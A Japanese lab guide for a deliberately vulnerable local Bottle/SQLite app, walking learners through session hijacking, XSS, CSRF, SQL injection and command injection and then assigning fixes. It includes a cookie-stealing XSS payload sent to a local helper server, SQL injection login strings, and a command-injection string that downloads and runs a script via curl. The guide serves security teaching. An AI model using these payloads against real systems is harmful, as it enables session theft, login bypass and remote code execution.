# 演習手順

各演習はローカル環境だけで行います。攻撃手法を覚えることが目的ではなく、「どの実装が、なぜ危険になるのか」を観察し、防御策を説明できるようにすることが目的です。

番号は教材全体で通番にしています。基本演習と発展演習で同じ番号は使いません。

| 番号 | 種別 | 内容 |
| --- | --- | --- |
| 1 | 基本 | 起動確認 |
| 2 | 基本 | Bottleのルーティング |
| 3 | 基本 | PeeweeとSQLite |
| 4 | 基本 | セッションハイジャック |
| 5 | 発展 | 署名付きCookieの比較 |
| 6 | 基本 | XSS |
| 7 | 発展 | XSSを説明する |
| 8 | 基本 | CSRF |
| 9 | 基本 | SQLインジェクション |
| 10 | 基本 | コマンドインジェクション |
| 11 | 基本 | Pico.cssでシンプルに整える |
| 12-18 | 発展 | 脆弱性の改修とレポート |

## 基本演習1: 起動確認

1. Webアプリを起動します。

   ```bash
   . .venv/bin/activate
   python app/main.py --reset-db
   ```

2. `http://localhost:8086` を開きます。
3. `koide` / `password` でログインします。
4. MyPageからBBSに移動し、コメントを投稿します。

観察ポイント:

- `app/data.db` が作成される。
- `Users` と `Comments` のテーブルにデータが保存される。
- Cookieにログイン状態が保存される。

## 基本演習2: Bottleのルーティング

`http://localhost:8086/hello/security` にアクセスし、`app/main.py` の `@get("/hello/<name>")` がどのようにHTMLを返すか確認します。

考察:

- URLの一部が関数引数に渡される仕組みを説明してください。
- Bottleの `template()` が何をしているか説明してください。

## 基本演習3: PeeweeとSQLite

SQLiteを直接確認します。

```bash
sqlite3 app/data.db
.tables
.schema users
.schema comments
select userid, username, password, cookie from users;
select commentid, user_id, comment, datetime from comments;
.quit
```

考察:

- PeeweeのModel定義とSQLiteのテーブル定義はどう対応しているか。
- パスワードが平文で保存されていることの問題点は何か。

## 基本演習4: セッションハイジャック

1. 通常ウィンドウで `koide` としてログインします。
2. シークレットウィンドウまたは別ブラウザで `alice` としてログインします。
3. それぞれのウィンドウで `http://localhost:8086/cookies` を開き、`cookie_id` の値を確認します。
4. `koide` 側の「ブラウザに保存されている値」をコピーし、`alice` 側の「ブラウザに保存する値をそのまま貼り付ける」に入力して保存します。
5. `alice` 側で `/mypage` を再読み込みします。

観察ポイント:

- Cookieをコピーすると別のログイン状態を再現できる。
- `/cookies` では、ブラウザに保存されている値と、署名検証後にアプリが使う値を比較できる。
- `/cookies` の「署名検証後にアプリが使う値」に `user1` や `user2` を入れると、演習補助としてアプリが署名付きCookieを作成する。
- この教材ではCookie値そのものは署名されています。「ブラウザに保存する値」として任意の `user1` などを直接入れるだけでは通りません。

## 発展演習5: 署名付きCookieの比較

- `app/main.py` の `response.set_cookie(..., secret=COOKIE_SECRET)` と `request.get_cookie(..., secret=COOKIE_SECRET)` から `secret` 指定を外すと、何が変わるか確認してください。
- 推測可能なセッションIDが危険な理由を説明してください。

## 基本演習6: XSS

1. 別ターミナルで補助サーバを起動します。

   ```bash
   . .venv/bin/activate
   python tools/attacker_server.py
   ```

2. Webアプリでログインし、BBSを開きます。
3. 次のコメントを投稿します。

   ```html
   <script>document.location="http://localhost:8090/?cookie_id="+document.cookie</script>
   ```

4. `http://localhost:8090` を開き、Cookie文字列が記録されたか確認します。

観察ポイント:

- `app/views/bbs.tpl` では `{{!comment.comment}}` によりHTMLエスケープを無効化している。
- ユーザ入力がそのままHTMLとして解釈される。
- Cookieに `HttpOnly` が付いていないため、JavaScriptから読める。

後片付け:

```bash
sqlite3 app/data.db "delete from comments where comment like '<script>%';"
```

## 発展演習7: XSSを説明する

基本演習6で観察したXSSについて、攻撃文字列そのものではなく、データの流れを説明してください。

説明すること:

- 入力したコメントは、どこに保存されたか。
- 保存されたコメントは、どのテンプレートでHTMLとして解釈されたか。
- `HttpOnly` を付けると何が変わり、何は変わらないか。
- 根本対策として、どの出力をどう変えるべきか。

## 基本演習8: CSRF

1. Webアプリでログインした状態にします。
2. 補助サーバを起動します。
3. 同じブラウザで `http://localhost:8090/csrf` を開きます。
4. ボタンを押します。
5. `http://localhost:8086/bbs` を確認します。

観察ポイント:

- 別サイトからのPOSTでも、ブラウザがCookieを付けて送信する。
- 掲示板フォームには固定の `token` があるが、サーバ側で検証していない。
- CSRF対策には、予測不能なトークンをサーバ側で検証する必要がある。

## 基本演習9: SQLインジェクション

ログイン画面で次を試します。

| username | password |
| --- | --- |
| `koide` | `' or 'a'='a` |
| `koide' --` | `anything` |

ログイン結果画面に表示されるSQLを確認します。

考察:

- 入力値がSQL文字列にどのように連結されているか。
- なぜPeeweeの検索ではなく、`sqlite3` でSQLを直接組み立てると危険なのか。
- プレースホルダを使うとSQLがどう変わるか。

## 基本演習10: コマンドインジェクション

1. Webアプリにログインします。
2. `/contact` を開きます。
3. メールアドレスには適当な文字列を入れます。
4. 連絡事項に次を入力して送信します。

   ```text
   "; /bin/echo injected > command_injection_result.txt; #
   ```

5. リポジトリのルートに `command_injection_result.txt` が作成されたか確認します。

補助サーバを使う例:

```text
"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #
```

観察ポイント:

- `app/main.py` の `/contact` は `os.system()` にユーザ入力を連結して渡している。
- 本来はメール送信ライブラリを使うべきで、シェルを経由する必要がない。
- どうしても外部コマンドを使う場合は、`subprocess.run([...], shell=False)` と引数配列を使う。

## 基本演習11: Pico.cssでシンプルに整える

大きめのUIキットではなく、Pico.cssを使ってセマンティックHTMLをそのまま整えます。サンプルは `examples/pico-css/` にあります。

追加する構成:

```text
app/
├── static/
│   └── app.css
└── views/
    ├── base.tpl
    └── login.tpl
```

`base.tpl` でPico.cssを読み込みます。

```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
<link rel="stylesheet" href="/static/app.css">
```

`app/main.py` に静的ファイル配信を追加します。

```python
from bottle import static_file

@get("/static/<filepath:path>")
def static_files(filepath):
    return static_file(filepath, root=str(BASE_DIR / "static"))
```

ログイン画面をテンプレートへ移します。

```python
@get("/login")
def login_form():
    return template("login", error=None)
```

観察ポイント:

- `label`、`input`、`button`、`nav` が少ない記述で整う。
- UI改善と脆弱性対策は別の作業として分けて考えられる。
- テンプレート化すると、XSS対策としてのエスケープ有無も確認しやすくなる。

## 次に進む発展演習

基本演習が終わったら、`docs/advanced-tasks.md` の発展演習12-18へ進みます。次の対策を1つずつ実装し、攻撃が通らなくなることを確認してください。

- 発展演習12: ログインSQLをプレースホルダに置き換える。
- 発展演習13: BBS表示でHTMLエスケープを有効にする。
- 発展演習14: Cookieに `httponly=True` と `samesite="Lax"` を付ける。
- 発展演習15: CSRFトークンをセッションごとに生成し、POST時に検証する。
- 発展演習16: `/contact` から `os.system()` を取り除く。
- 発展演習17: パスワードをハッシュ化して保存する。
- 発展演習18: 観察、原因、修正、再テストをレポートにまとめる。

まとめ課題:

- 各脆弱性について「原因となる実装」「観察できた現象」「対策」を1枚の表にまとめてください。
